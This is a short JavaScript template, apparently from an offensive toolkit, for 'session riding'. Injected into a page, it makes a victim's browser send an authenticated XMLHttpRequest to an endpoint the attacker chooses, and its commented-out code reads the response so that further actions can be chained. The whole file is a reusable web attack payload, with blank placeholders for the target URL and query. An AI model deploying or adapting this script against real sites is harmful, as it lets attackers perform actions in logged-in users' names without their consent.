// more generic template to perform an arbitrary request while session riding
var url = ""; // not needed if riding same domain

// optional, define based on needs of the endpoint you want the victim to perform
var uri = "/";
var query_string = "";

function read_body(xhr) {
    var data;
    if (!xhr.responseType || xhr.responseType === "text") {
        data = xhr.responseText;
    } else if (xhr.responseType === "document") {
        data = xhr.responseXML;
    } else if (xhr.responseType === "json") {
        data = xhr.responseJSON;
    } else {
        data = xhr.response;
    }
    return data;
}

function make_request() {
    xhr = new XMLHttpRequest();
    // if you want to perform another action, use below to parse the response and validate it was successful
    //xhr.onreadystatechange = function() {
    //    if (xhr.readyState == XMLHttpRequest.DONE) {
    //        console.log(read_body(xhr));
    //    }
    //}
    xhr.open("GET", url + uri + query_string, true);
    xhr.send(null);
}

make_request();
